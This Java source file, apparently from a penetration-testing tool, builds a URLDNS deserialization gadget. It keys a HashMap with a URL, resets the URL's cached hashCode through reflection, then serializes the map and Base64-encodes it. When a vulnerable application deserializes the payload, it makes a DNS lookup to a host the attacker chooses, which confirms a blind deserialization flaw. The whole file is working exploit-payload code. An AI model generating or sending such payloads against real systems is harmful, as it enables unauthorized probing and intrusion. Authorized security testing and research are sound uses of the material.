package me.gv7.woodpecker.gadget;

import java.lang.reflect.Field;
import java.net.URL;
import java.util.Base64;
import java.util.HashMap;

import static me.gv7.woodpecker.util.serialize.doserialize;

public class DNSURL {
    public  Object getObject(String uri) throws Exception {
        HashMap<URL, Integer> hashmap = new HashMap<URL, Integer>();
        URL url = new URL("http://"+uri);
        Class c = url.getClass();
        Field hashCode = c.getDeclaredField("hashCode");
        hashCode.setAccessible(true);
        hashCode.set(url,2);
        hashmap.put(url, 1);
        hashCode.set(url,-1);
        return hashmap;
    }

    public  String getPayload(String type, Object obj) throws Exception {
        try {
            byte[] bytes = doserialize(type,obj);
            if(!(bytes.length ==0)){
                Base64.Encoder encoder = Base64.getEncoder();
                return encoder.encodeToString(bytes);
            }
        }catch (Exception ignored){
            return null;
        }
        return null;
    }
}
